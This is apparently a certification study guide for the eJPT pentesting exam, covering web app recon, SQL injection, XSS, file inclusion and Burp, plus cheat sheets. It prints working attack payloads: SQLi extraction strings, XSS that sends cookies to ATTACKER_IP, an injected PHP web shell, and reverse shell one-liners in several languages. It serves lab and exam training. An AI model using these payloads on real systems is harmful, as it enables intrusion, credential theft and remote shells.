<div style="page-break-after: always;"></div>

# Domain 4: Web Application Penetration Testing (15%)

## 4.1 Web App Reconnaissance

```bash
# Technology identification
whatweb http://target               # detect CMS, framework, server, headers
curl -I http://target               # headers only — look for Server: and X-Powered-By:
nmap -sV --script=http-headers,http-title -p 80,443,8080 target

# Directory/file discovery ⭐
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
# -t 50 = 50 threads (faster)

# Always check these manually:
curl http://target/robots.txt       # Google crawl disallows = sensitive paths
curl http://target/sitemap.xml
# Also: /admin, /login, /wp-admin, /phpmyadmin, /backup, /.git, /.env, /config

# Nikto — quick server vulnerability scan
nikto -h http://target
nikto -h http://target -Tuning 1    # interesting files only (faster)
```

## 4.2 SQL Injection (SQLi) ⭐

**What it is:** When user input is directly inserted into a SQL query without sanitization. Attacker can manipulate the query to extract database contents, bypass login, or execute commands.

```sql
-- ── DETECTION ─────────────────────────────────────────────────────────────────
-- Try these in any input field (URL params, login forms, search boxes):
'                           -- single quote to break the query
''                          -- escaped quote
1' OR '1'='1               -- always true (login bypass)
1' OR 1=1--                 -- always true with comment
1' OR 1=1#                  -- MySQL comment style
admin'--                    -- comment out password check
' OR 'x'='x                 -- classic always-true

-- ── LOGIN BYPASS ─────────────────────────────────────────────────────────────
-- Username: admin'--
-- Password: anything
-- Result: logs in as admin (the -- comments out the password check)

-- ── UNION-BASED EXTRACTION ────────────────────────────────────────────────────
-- Step 1: Find number of columns
' ORDER BY 1--    -- works
' ORDER BY 2--    -- works
' ORDER BY 3--    -- works
' ORDER BY 4--    -- ERROR → 3 columns!

-- Step 2: Find which columns are displayed
' UNION SELECT 1,2,3--              -- see which numbers appear on page

-- Step 3: Extract data (if column 2 is shown)
' UNION SELECT 1,database(),3--            -- current database name
' UNION SELECT 1,user(),3--               -- current MySQL user
' UNION SELECT 1,@@version,3--            -- MySQL version
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,concat(username,':',password),3 FROM users--

-- ── BLIND SQLi (no visible output) ───────────────────────────────────────────
-- Boolean-based: page behaves differently if true vs false
' AND 1=1--                -- page loads normally
' AND 1=2--                -- page changes or breaks

-- Time-based: inject delays to confirm
' AND SLEEP(5)--           -- if page takes 5s extra, SQLi confirmed
'; WAITFOR DELAY '00:00:05'--  -- SQL Server version
```

### SQLmap — Automated SQLi ⭐

```bash
# Basic scan (GET parameter)
sqlmap -u "http://target/page.php?id=1"
sqlmap -u "http://target/page.php?id=1" --dbs              # list databases
sqlmap -u "http://target/page.php?id=1" -D mydb --tables   # list tables in db
sqlmap -u "http://target/page.php?id=1" -D mydb -T users --dump  # dump table

# POST request
sqlmap -u "http://target/login.php" --data="user=test&pass=test" -p user

# With session cookies (authenticated session)
sqlmap -u "http://target/page.php?id=1" --cookie="PHPSESSID=abc123"

# From a captured Burp Suite request file
sqlmap -r burp_request.txt

# Risk and level (increase if basic fails)
sqlmap -u "http://target/page.php?id=1" --level=3 --risk=2

# Get OS-level access if possible
sqlmap -u "http://target/page.php?id=1" --os-shell  # interactive OS shell
```

## 4.3 Cross-Site Scripting (XSS)

XSS = inject JavaScript into a page that gets executed in a victim's browser.

```html
<!-- ── BASIC DETECTION PAYLOADS ──────────────────────────────────────────── -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
<svg onload=alert('XSS')>
javascript:alert('XSS')

<!-- ── STEAL SESSION COOKIE ──────────────────────────────────────────────── -->
<script>document.location='http://ATTACKER_IP/steal?c='+document.cookie</script>
<script>fetch('http://ATTACKER_IP/steal?c='+document.cookie)</script>

<!-- ── CONTEXT: Reflected vs Stored vs DOM ────────────────────────────────── -->
<!-- Reflected: payload is in URL, only affects the requesting user -->
<!-- Stored: payload saved in database, affects ALL users who view that page -->
<!-- DOM: payload manipulates the page's DOM via JavaScript (client-side only) -->
```

## 4.4 File Inclusion

**Local File Inclusion (LFI):** Include local server files through a vulnerable parameter.

```bash
# ── DETECTION ─────────────────────────────────────────────────────────────────
http://target/page.php?file=../../../../etc/passwd
http://target/page.php?file=../../../../etc/shadow
http://target/page.php?file=../../../../windows/win.ini
http://target/page.php?file=../../../../windows/system32/drivers/etc/hosts

# ── NULL BYTE BYPASS (old PHP < 5.3) ──────────────────────────────────────────
http://target/page.php?file=../../../../etc/passwd%00

# ── PATH TRAVERSAL WITH WRAPPERS ──────────────────────────────────────────────
http://target/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
# Decode the output: echo '<base64_output>' | base64 -d

# ── LFI TO RCE VIA LOG POISONING ──────────────────────────────────────────────
# Step 1: Inject PHP into Apache access log via User-Agent header:
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
# Step 2: Include the log file via LFI:
http://target/page.php?file=../../../../var/log/apache2/access.log&cmd=id
http://target/page.php?file=../../../../var/log/nginx/access.log&cmd=whoami
```

**Remote File Inclusion (RFI):** Include a file from a remote server (requires `allow_url_include=On` in PHP config — rare but exists in old systems).

```bash
# Host a PHP shell on your machine:
python3 -m http.server 80
# Create /var/www/html/shell.php on your machine:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Then include it remotely:
http://target/page.php?file=http://ATTACKER_IP/shell.php&cmd=id
```

## 4.5 Burp Suite Basics

**Purpose:** Intercept and modify HTTP requests between your browser and the web server. Essential for web app testing.

```
Setup (one time):
1. Open Burp Suite → Proxy tab → Proxy settings
2. Listen on 127.0.0.1:8080
3. Configure your browser proxy: HTTP Proxy = 127.0.0.1, Port = 8080
4. Download and install Burp CA certificate (Proxy → CA Certificate → install in browser)
5. Browse to target → requests appear in Proxy → HTTP history

Key tabs:
- Proxy → HTTP history → see all requests/responses
- Repeater → send a modified request and see response instantly
- Intruder → automated fuzzing (brute force params, payloads)
- Decoder → Base64 encode/decode, URL encode, HTML encode

Workflow:
1. Browse to login page
2. Turn on intercept (Proxy tab → Intercept is on)
3. Submit login form → request is captured
4. Modify username/password → Forward
5. OR: right-click → "Send to Repeater" → test SQLi there
```

<div style="page-break-after: always;"></div>

# eJPT Cheatsheets and Quick Reference

## Ports Cheat Sheet

| Port | Protocol | Service | First thing to try |
|---|---|---|---|
| 21 | TCP | FTP | Anonymous login → `ftp target` user: anonymous |
| 22 | TCP | SSH | `ssh user@target`, brute force with Hydra |
| 23 | TCP | Telnet | `telnet target` with default creds |
| 25 | TCP | SMTP | User enumeration with smtp-enum-users NSE script |
| 53 | UDP | DNS | Zone transfer: `dig axfr @ns1.target target.com` |
| 80/443 | TCP | HTTP/S | gobuster, nikto, manual browsing |
| 139/445 | TCP | SMB | enum4linux-ng, smbclient -L //target -N |
| 1433 | TCP | MSSQL | `sqlmap`, nmap scripts |
| 3306 | TCP | MySQL | `mysql -h target -u root`, sqlmap |
| 3389 | TCP | RDP | `xfreerdp /u:admin /p:pass /v:target`, brute force |
| 5432 | TCP | PostgreSQL | `psql -h target -U postgres` |
| 5985 | TCP | WinRM | `evil-winrm -i target -u admin -p pass` |
| 6379 | TCP | Redis | `redis-cli -h target`, often no auth |
| 8080 | TCP | HTTP-alt | Same as 80, often dev/admin panels |
| 27017 | TCP | MongoDB | `mongosh --host target`, often no auth |

## Nmap Timing Templates (Corrected)

| Template | Name | Use case |
|---|---|---|
| -T0 | Paranoid | IDS evasion, extremely slow |
| -T1 | Sneaky | Very slow, stealthy |
| -T2 | Polite | Slow, reduces network load |
| -T3 | Normal | Default speed |
| -T4 | Aggressive | Faster, good for lab environments |
| -T5 | Insane | Very fast, unreliable, misses ports |

## Essential Wordlists (Kali Linux)

```bash
/usr/share/wordlists/rockyou.txt                              # 14M passwords
/usr/share/wordlists/dirb/common.txt                          # 4.6K web directories
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  # 220K web directories
/usr/share/wordlists/metasploit/unix_passwords.txt            # 1.7K Unix passwords
/usr/share/seclists/                                          # apt install seclists
```

## Reverse Shell One-liners (Replace ATTACKER_IP and 4444)

```bash
# Bash (Linux)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python 3 (Linux)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Netcat with -e flag (older nc)
nc -e /bin/bash ATTACKER_IP 4444

# Netcat without -e flag (modern nc doesn't have -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

## Exam Day Tips

1. **Read the Letter of Engagement FIRST** — it defines your scope. Attacking out-of-scope machines can disqualify you.
2. **Enumerate ALL machines before exploiting anything** — run `db_nmap -sV -sC -p- 192.168.x.0/24` in msfconsole to scan the whole subnet and store results.
3. **Check for dual-homed machines** — always run `ip a` or `ipconfig /all` after getting a shell. Hidden subnets = more questions.
4. **Document everything in real time** — screenshot every finding: open ports, service versions, exploits used, credentials found, flags.
5. **Use Metasploit's database** — `db_nmap`, `hosts`, `services` — store and query your recon.
6. **Start with low-hanging fruit** — anonymous FTP, default credentials, old/vulnerable service versions, SQLi on login pages.
7. **When stuck, re-read the question** — the question text tells you WHAT to find. The answer is always in the lab, discoverable through enumeration.
8. **Answer all 35 questions from actual findings** — never guess. 70% = 25/35. If you properly enumerate everything, you will find the answers.
9. **Sleep** — 48 hours is long. Day 1: enumerate all, exploit accessible machines. Sleep. Day 2: pivot to internal networks, finish remaining machines.
10. **Upgrade your shells** — a raw shell is hard to work with. Always upgrade with `python3 -c 'import pty; pty.spawn("/bin/bash")'` immediately.

## Practice Resources

| Resource | Type | Cost | Value |
|---|---|---|---|
| TryHackMe "Jr Pentester" Path | Guided learning | Free/paid | ★★★★★ Directly maps to eJPT |
| INE PTS (Penetration Testing Student) | Official prep | Free tier | ★★★★★ Official eJPT prep |
| HackTheBox Academy | Guided learning | Paid | ★★★★ Good depth |
| Vulnhub | Downloadable VMs | Free | ★★★★ Practice environments |
| TryHackMe rooms: Nmap, Metasploit, Burp Suite | Individual rooms | Free | ★★★★ Specific tool practice |

## Readiness checklist

- [ ] Can run a full Nmap scan (all ports, versions, scripts) and interpret the output
- [ ] Can enumerate SMB shares anonymously with smbclient and enum4linux-ng
- [ ] Can search for exploits with searchsploit and find the Metasploit equivalent
- [ ] Can exploit MS17-010 (EternalBlue) with Metasploit from scratch
- [ ] Can catch a reverse shell with Netcat and upgrade it to a proper TTY
- [ ] Can use Hydra to brute force SSH and FTP
- [ ] Can use gobuster to find hidden web directories
- [ ] Can manually test for SQL injection and use SQLmap to exploit it
- [ ] Can identify dual-homed machines and pivot with Metasploit routes + proxychains
- [ ] Can perform basic Linux and Windows privilege escalation
- [ ] Have rooted at least 5 TryHackMe easy machines end-to-end
